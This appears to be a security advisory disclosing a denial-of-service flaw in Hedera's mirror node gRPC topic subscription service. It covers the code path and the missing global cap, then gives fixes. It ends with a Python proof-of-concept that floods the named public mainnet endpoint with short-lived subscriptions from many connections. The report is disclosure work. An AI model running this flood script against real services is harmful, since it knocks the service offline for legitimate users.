### Title
Unbounded Concurrent Subscription Accumulation via `endTime` Manipulation Causes JVM Memory Exhaustion

### Summary
`TopicMessageServiceImpl.subscribeTopic()` creates a full Reactor Flux pipeline per subscription that remains alive for at least `endTimeInterval` (default 30 seconds) after the requested `endTime` passes, due to the polling design of `pastEndTime()`. There is no global cap on concurrent subscriptions — `subscriberCount` is a metric gauge only, never used to reject new subscriptions — and the per-connection limit of 5 (`maxConcurrentCallsPerConnection`) is trivially bypassed by opening many TCP connections. An unprivileged attacker can continuously open subscriptions with `endTime` set 1 nanosecond in the future, accumulating thousands of live Flux pipelines and exhausting JVM heap.

### Finding Description

**Exact code path:**

In `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `subscribeTopic()` (lines 59–92) constructs three Flux pipelines per subscription:

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

The subscription is kept alive by `pastEndTime()` (lines 123–131):

```java
return Flux.empty()
        .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                .withFixedDelay(grpcProperties.getEndTimeInterval()));
```

`isComplete()` (lines 203–214) only returns `true` when:

```java
return Instant.ofEpochSecond(0, filter.getEndTime())
        .plus(grpcProperties.getEndTimeInterval())
        .isBefore(Instant.now());
```

With `endTimeInterval` defaulting to 30 seconds (`GrpcProperties.java` line 22), even a subscription with `endTime = now + 1ns` will hold its entire Flux pipeline open for ~30 seconds.

**Root cause:** `subscriberCount` (line 48) is an `AtomicLong` used exclusively as a Micrometer gauge metric (lines 52–56, 89–90). It is incremented on subscribe and decremented on termination, but **never checked** to gate or reject new subscriptions. There is no `if (subscriberCount.get() > MAX) return error` guard anywhere in `subscribeTopic()`.

**Why the existing check fails:** `maxConcurrentCallsPerConnection = 5` (`NettyProperties.java` line 14, applied in `GrpcConfiguration.java` line 33) limits calls per single TCP connection. An attacker opens N TCP connections (no IP-level connection limit exists in the codebase), each carrying 5 subscriptions, yielding 5N concurrent live pipelines. With N=1000 connections, that is 5000 simultaneous Flux pipelines, each holding a `TopicContext`, a `RepeatSpec` with `Long.MAX_VALUE` iterations, a `boundedElastic` scheduler task, and listener registrations.

**`TopicMessageFilter` validation** (`TopicMessageFilter.java` lines 43–50) only requires `endTime > startTime` and `startTime <= now`. A filter with `startTime = now`, `endTime = now + 1` passes all validation and triggers the full 30-second pipeline lifetime.

### Impact Explanation

Each live subscription retains: a `TopicContext` with two `AtomicReference`/`AtomicLong` fields, three composed Flux chains, a `RepeatSpec` scheduled on the event loop, and a `boundedElastic` thread reservation for the safety-check branch. At scale (thousands of subscriptions), heap pressure from accumulated objects causes GC thrashing and ultimately `OutOfMemoryError`, crashing the gRPC service. This denies topic message streaming to all legitimate users of the mirror node's HCS API, which is a primary interface for Hedera Consensus Service consumers.

### Likelihood Explanation

No authentication is required to call `subscribeTopic()` — the gRPC endpoint is publicly accessible. The attacker needs only a gRPC client (e.g., `grpcurl` or the Hedera SDK), a valid topic ID (publicly enumerable from the mirror node REST API), and the ability to open many TCP connections (achievable from a single host or a small botnet). The attack is repeatable and self-sustaining: as old subscriptions expire after ~30s, the attacker opens new ones to maintain the load. The `subscriberCount` metric will alert operators, but there is no automatic circuit-breaker to stop the accumulation.

### Recommendation

1. **Enforce a global subscription cap** in `subscribeTopic()` before constructing any Flux:
   ```java
   if (subscriberCount.get() >= grpcProperties.getMaxSubscribers()) {
       return Flux.error(Status.RESOURCE_EXHAUSTED.asRuntimeException());
   }
   ```
   Add `maxSubscribers` (e.g., default 5000) to `GrpcProperties`.

2. **Enforce a per-IP or per-connection subscription cap** at the gRPC interceptor level, rejecting new calls when a single remote address exceeds a threshold.

3. **Reduce `endTimeInterval`** or add a minimum `endTime` distance check so that subscriptions with `endTime` in the near past/future complete immediately rather than waiting 30 seconds.

4. **Add a maximum `endTime` window** validation in `TopicMessageFilter` (e.g., `endTime - startTime <= maxWindow`) to prevent subscriptions that would hold pipelines open for arbitrarily long durations.

### Proof of Concept

**Preconditions:** Public gRPC endpoint accessible; any valid topic ID (e.g., `0.0.1234`).

**Steps:**

```python
import grpc, threading, time
from hedera import ConsensusServiceStub, ConsensusTopicQuery, Timestamp

TARGET = "mainnet-public.mirrornode.hedera.com:443"
TOPIC  = "0.0.1234"

def flood():
    while True:
        channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
        stub = ConsensusServiceStub(channel)
        now_ns = time.time_ns()
        req = ConsensusTopicQuery(
            topicID=TOPIC,
            consensusStartTime=Timestamp(seconds=now_ns//10**9, nanos=now_ns%10**9),
            consensusEndTime=Timestamp(seconds=now_ns//10**9, nanos=(now_ns%10**9)+1),
            # endTime = now + 1 nanosecond
        )
        # Open 5 concurrent calls on this connection (maxConcurrentCallsPerConnection)
        for _ in range(5):
            threading.Thread(target=lambda: list(stub.subscribeTopic(req)), daemon=True).start()
        time.sleep(0.1)  # new connection every 100ms = 50 connections/s = 250 subs/s

for _ in range(20):
    threading.Thread(target=flood, daemon=True).start()

time.sleep(120)  # After 2 minutes: ~30,000 concurrent live pipelines
```

**Result:** `subscriberCount` metric climbs unboundedly; JVM heap exhausts; gRPC service crashes or becomes unresponsive with `OutOfMemoryError` or severe GC pauses, denying service to all legitimate subscribers.